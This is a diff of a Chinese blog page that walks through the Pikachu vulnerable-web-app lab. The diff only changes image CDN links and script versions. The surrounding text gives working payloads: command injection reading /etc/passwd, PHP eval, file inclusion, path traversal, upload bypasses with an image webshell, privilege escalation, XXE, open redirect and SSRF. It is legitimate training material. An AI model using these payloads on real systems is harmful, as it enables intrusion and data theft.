-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image62.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image62.png"></p>
 <hr>
 <h2 id="四、RCE-远程代码执行"><a href="#四、RCE-远程代码执行" class="headerlink" title="四、RCE 远程代码执行"></a>四、RCE 远程代码执行</h2><blockquote>
 <p>⚡ RCE（Remote Code Execution）是危害最高的漏洞类型之一，攻击者可直接在服务器上执行任意命令或代码。</p>
@@ -451,14 +451,14 @@
 <p><strong>💣 管道命令注入示例：</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | <span class="built_in">whoami</span></span><br><span class="line">127.0.0.1 | <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image63.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image63.png"></p>
 <hr>
 <h3 id="4-2-exec-“eval”"><a href="#4-2-exec-“eval”" class="headerlink" title="4.2 exec “eval”"></a>4.2 exec “eval”</h3><p><strong>📖 概念：</strong> 该功能直接 <code>eval()</code> 执行用户输入的 PHP 代码，危害极大。</p>
 <p><strong>💣 Payload：</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
 
 <p>直接执行，页面返回完整 phpinfo 信息 ✅</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image64.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image64.png"></p>
 <hr>
 <h2 id="五、文件操作漏洞"><a href="#五、文件操作漏洞" class="headerlink" title="五、文件操作漏洞"></a>五、文件操作漏洞</h2><hr>
 <h3 id="5-1-本地文件包含（LFI）"><a href="#5-1-本地文件包含（LFI）" class="headerlink" title="5.1 本地文件包含（LFI）"></a>5.1 本地文件包含（LFI）</h3><p><strong>📖 概念：</strong> 服务端通过 <code>include()</code> 等函数动态加载文件，若参数可控且未过滤路径穿越符，攻击者可读取任意文件。</p>
@@ -471,51 +471,51 @@
 <p>预先在目标路径写入如下文件 <code>1.php</code>：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image65.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image65.png"></p>
 <hr>
 <h3 id="5-2-远程文件包含（RFI）"><a href="#5-2-远程文件包含（RFI）" class="headerlink" title="5.2 远程文件包含（RFI）"></a>5.2 远程文件包含（RFI）</h3><p><strong>📖 概念：</strong> 若服务端 PHP 配置开启了 <code>allow_url_include</code>，可以包含远程 URL 指向的恶意文件。</p>
 <p><strong>💣 Payload：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&amp;submit=提交</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image66.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image66.png"></p>
 <blockquote>
 <p>💡 实战中可将 <code>filename</code> 参数指向包含 Webshell 的远程服务器，获取权限。</p>
 </blockquote>
 <hr>
 <h3 id="5-3-不安全的文件下载"><a href="#5-3-不安全的文件下载" class="headerlink" title="5.3 不安全的文件下载"></a>5.3 不安全的文件下载</h3><p><strong>📖 概念：</strong> 文件下载接口的 <code>filename</code> 参数未过滤，可通过路径穿越读取任意文件。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image67.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image67.png"></p>
 <p><strong>💣 构造路径穿越下载源码：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsafedownload/execdownload.php?filename=../../../index.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image68.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image68.png"></p>
 <hr>
 <h3 id="5-4-文件上传-—-客户端校验绕过"><a href="#5-4-文件上传-—-客户端校验绕过" class="headerlink" title="5.4 文件上传 — 客户端校验绕过"></a>5.4 文件上传 — 客户端校验绕过</h3><p><strong>📖 概念：</strong> 文件类型校验仅在前端 JavaScript 中完成，禁用 JS 即可绕过。</p>
 <p><strong>🔍 查看源代码，确认是前端检测：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image69.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image70.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image69.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image70.png"></p>
 <p><strong>🔍 步骤：</strong></p>
 <ol>
 <li>在浏览器中禁用 JavaScript</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image71.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image71.png"></p>
 <ol start="2">
 <li>再次上传 <code>.php</code> 文件，已无校验限制</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image72.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image72.png"></p>
 <ol start="3">
 <li>访问上传路径，执行成功 ✅</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/unsafeupload/uploads/1.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image73.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image73.png"></p>
 <hr>
 <h3 id="5-5-文件上传-—-服务端校验绕过"><a href="#5-5-文件上传-—-服务端校验绕过" class="headerlink" title="5.5 文件上传 — 服务端校验绕过"></a>5.5 文件上传 — 服务端校验绕过</h3><h4 id="MIME-类型检测绕过"><a href="#MIME-类型检测绕过" class="headerlink" title="MIME 类型检测绕过"></a>MIME 类型检测绕过</h4><p><strong>📖 概念：</strong> 服务端检测 <code>Content-Type</code> 字段，在 Burp Suite 中将其修改为 <code>image/png</code> 即可绕过。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image74.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image74.png"></p>
 <h4 id="getimagesize-图片头检测绕过"><a href="#getimagesize-图片头检测绕过" class="headerlink" title="getimagesize() 图片头检测绕过"></a>getimagesize() 图片头检测绕过</h4><p><strong>📖 概念：</strong> <code>getimagesize()</code> 通过读取文件头来判断是否是合法图片，可制作<strong>图片马</strong>（在图片文件末尾附加 PHP 代码）来绕过。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 制作图片马</span></span><br><span class="line">copy normal.png /b + shell.php /a webshell.png</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image75.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image76.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image75.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image76.png"></p>
 <blockquote>
 <p>⚠️ 注意：上传后文件后缀为 <code>.png</code>，无法直接用工具连接 Webshell。需结合<strong>文件包含漏洞</strong>，通过包含图片马来触发执行。</p>
 </blockquote>
@@ -529,8 +529,8 @@
 <ol>
 <li>登录账号，查看个人信息</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image77.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image78.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image77.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image78.png"></p>
 <ol start="2">
 <li>观察 URL 参数：</li>
 </ol>
@@ -541,16 +541,16 @@
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image79.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image79.png"></p>
 <hr>
 <h3 id="6-2-垂直越权"><a href="#6-2-垂直越权" class="headerlink" title="6.2 垂直越权"></a>6.2 垂直越权</h3><p><strong>📖 概念：</strong> 低权限用户访问高权限用户才能使用的功能。（如普通用户访问管理员接口）</p>
 <p><strong>🔍 步骤：</strong></p>
 <ol>
 <li>分别登录普通用户 <code>pikachu</code> 和管理员 <code>Admin</code>，对比页面差异</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image80.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image81.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image82.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image80.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image81.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image82.png"></p>
 <ol start="2">
 <li>管理员点击”添加用户”时，URL 为：</li>
 </ol>
@@ -559,8 +559,8 @@
 <ol start="3">
 <li>切换回 <code>pikachu</code> 普通用户的 Cookie，直接访问该 URL，成功操作管理员功能 ✅</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image83.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image84.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image83.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image84.png"></p>
 <hr>
 <h2 id="七、目录遍历"><a href="#七、目录遍历" class="headerlink" title="七、目录遍历"></a>七、目录遍历</h2><p><strong>📖 概念：</strong> 服务端接受用户控制的文件路径参数，未作充分限制，攻击者可通过 <code>../</code> 跨越目录访问任意文件。</p>
 <p><strong>🔍 观察 URL：</strong></p>
@@ -569,12 +569,12 @@
 <p><strong>💣 构造路径穿越：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/dir/dir_list.php?title=../../../../../../1.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image85.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image85.png"></p>
 <hr>
 <h2 id="八、敏感信息泄露"><a href="#八、敏感信息泄露" class="headerlink" title="八、敏感信息泄露"></a>八、敏感信息泄露</h2><p><strong>📖 概念：</strong> 应用程序无意间将敏感信息暴露在前端页面（如 HTML 注释、JS 文件、报错信息等）。</p>
 <p><strong>🔍 直接查看页面源代码即可发现：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image86.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image87.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image86.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image87.png"></p>
 <hr>
 <h2 id="九、PHP-反序列化漏洞"><a href="#九、PHP-反序列化漏洞" class="headerlink" title="九、PHP 反序列化漏洞"></a>九、PHP 反序列化漏洞</h2><p><strong>📖 概念：</strong> 当反序列化的内容可被用户控制，且后端使用了危险的魔法函数时，就会产生安全漏洞。</p>
 <h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><table>
@@ -636,19 +636,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>提交后成功触发 XSS ✅</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image88.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image88.png"></p>
 <hr>
 <h2 id="十、XXE-漏洞"><a href="#十、XXE-漏洞" class="headerlink" title="十、XXE 漏洞"></a>十、XXE 漏洞</h2><p><strong>📖 概念：</strong> XXE（XML External Entity）即 XML 外部实体注入，攻击者通过构造恶意 XML 文档，利用外部实体读取服务器文件或发起 SSRF 攻击。</p>
 <p><strong>💣 Payload（读取 Windows 系统文件）：</strong></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image89.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image89.png"></p>
 <hr>
 <h2 id="十一、不安全的-URL-跳转"><a href="#十一、不安全的-URL-跳转" class="headerlink" title="十一、不安全的 URL 跳转"></a>十一、不安全的 URL 跳转</h2><p><strong>📖 概念：</strong> 应用程序使用用户可控的参数作为跳转目标 URL，可被用于钓鱼攻击（将用户引导至恶意站点）。</p>
 <p><strong>💣 构造恶意跳转：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/urlredirect/urlredirect.php?url=http://baidu.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image90.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image90.png"></p>
 <hr>
 <h2 id="十二、SSRF-服务端请求伪造"><a href="#十二、SSRF-服务端请求伪造" class="headerlink" title="十二、SSRF 服务端请求伪造"></a>十二、SSRF 服务端请求伪造</h2><blockquote>
 <p>🌐 SSRF（Server-Side Request Forgery）是指攻击者构造请求，由<strong>服务器</strong>代为发起，可访问内网资源、绕过防火墙。</p>
@@ -660,7 +660,7 @@
 <h3 id="12-1-SSRF（curl）"><a href="#12-1-SSRF（curl）" class="headerlink" title="12.1 SSRF（curl）"></a>12.1 SSRF（curl）</h3><p><strong>💣 利用 curl 访问内网资源：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image91.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image91.png"></p>
 <hr>
 <h3 id="12-2-SSRF（file-get-contents）"><a href="#12-2-SSRF（file-get-contents）" class="headerlink" title="12.2 SSRF（file_get_contents）"></a>12.2 SSRF（file_get_contents）</h3><p><strong>💣 利用 file_get_contents 访问内网资源：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure>
@@ -1122,7 +1122,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa62" defer></script>
+<script src="/js/main.js?v=mp5bt8nz" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1386,7 +1386,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa63"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8nz"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
